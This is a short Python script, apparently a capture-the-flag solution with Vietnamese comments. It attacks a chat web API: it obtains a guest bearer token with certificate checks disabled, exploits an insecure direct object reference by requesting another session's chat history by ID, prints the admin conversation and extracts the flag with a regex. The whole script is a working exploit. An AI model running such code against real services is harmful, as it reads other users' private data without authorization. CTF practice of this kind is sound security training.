import urllib.request
import json
import ssl
import re

def solve():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    BASE_URL = "https://2df5fc61-263d-4248-88f4-a4aebcc618bd.222.255.138.122.nip.io"

    # 1. Lấy token guest
    auth_req = urllib.request.Request(f"{BASE_URL}/api/auth/guest", method="POST")
    with urllib.request.urlopen(auth_req, context=ctx) as res:
        auth_data = json.loads(res.read().decode())
        token = auth_data["token"]
        print(f"[*] Obtained Guest Token: {token}")

    # 2. Khai thác IDOR để đọc session của admin (session_id = 2026)
    history_req = urllib.request.Request(
        f"{BASE_URL}/api/chat/history?session_id=2026",
        headers={"Authorization": f"Bearer {token}"}
    )

    with urllib.request.urlopen(history_req, context=ctx) as res:
        data = json.loads(res.read().decode())
        print("\n[*] Retrieved Admin Conversation:")
        flag = None
        for msg in data.get("messages", []):
            content = msg.get("content", "")
            print(f"[{msg.get('role')}]: {content}")
            m = re.search(r'flag\{[^}]+\}', content)
            if m:
                flag = m.group(0)
        
        if flag:
            print(f"\n[+] Extracted Flag: {flag}")
            return flag

if __name__ == "__main__":
    solve()
